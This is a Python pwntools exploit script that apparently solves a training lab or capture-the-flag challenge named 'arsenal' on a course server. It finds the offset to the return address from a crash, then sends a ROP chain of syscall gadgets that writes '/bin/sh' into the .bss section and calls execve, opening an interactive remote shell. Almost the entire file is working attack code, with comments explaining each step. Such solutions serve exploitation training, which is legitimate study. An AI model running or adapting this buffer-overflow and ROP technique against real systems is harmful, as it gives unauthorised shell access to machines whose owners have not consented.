#!/usr/bin/env python3
from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13581

context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab8/challenges/03_arsenal/arsenal', checksec=False)
context.arch = 'amd64'

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_ret_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b'weapons:\n')
    p_crash.sendline(cyclic(200))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_value = core.read(core.rsp, 4)
    
    offset = cyclic_find(crash_value)
    print(f"Calculated offset to RIP: {offset}")
    return offset

OFFSET_TO_RIP = get_ret_offset()


r=conn()
execve_syscall_num = 59
#bin_sh_string_addr = next(elf.search(b'/bin/sh'))    #address of "bin/sh"" -> NOT IN THE FILE

#since no /bin/sh string in the file, i write it to .bss writable region then point to it

bin_sh_string_addr = elf.sym.armory   #choose a address in bss where to put my binsh string

# ROP chain
payload = flat(
    b'A' * OFFSET_TO_RIP,

    # read(0, binsh_addr, 8)
    p64(elf.sym.pop_rax_ret), p64(0),                       # syscall arg 1: syscall number: 0 for read
    p64(elf.sym.pop_rdi_ret), p64(0),                       # syscall arg 2: arg1 of the read. Read from stdin=0
    p64(elf.sym.pop_rsi_ret), p64(bin_sh_string_addr),      # syscall arg 3: arg2 of the read: address where to put the read string: binsh_addr
    p64(elf.sym.pop_rdx_ret), p64(8),                       # syscall arg 4: arg3 of the read: number of bytes to read, 8
    p64(elf.sym.syscall_ret),                               # syscall(0, 0, binsh_addr, 8)

    # execve("bin/sh", NULL, NULL)
    #p64(elf.sym.ret_gadget),
    p64(elf.sym.pop_rax_ret), p64(execve_syscall_num),      # syscall arg 1: syscall number: 59 for execve
    p64(elf.sym.pop_rdi_ret), p64(bin_sh_string_addr),      # syscall arg 2: arg1 of the execve. In this case the "bin/sh" string, so i pass its address
    p64(elf.sym.pop_rsi_ret), p64(0x0),                     # syscall arg 3: arg2 of the execve: NULL
    p64(elf.sym.pop_rdx_ret), p64(0x0),                     # syscall arg 4: arg3 of the execve: NULL
    p64(elf.sym.syscall_ret),                               # syscall(SYS_execve, "bin/sh", NULL, NULL);
)

r.recvuntil(b'weapons:\n')
r.send(payload)
r.send(b"/bin/sh\x00")  #after overflow, rop executes read, waiting for 8 bytes, read into binsh_addr
r.interactive()
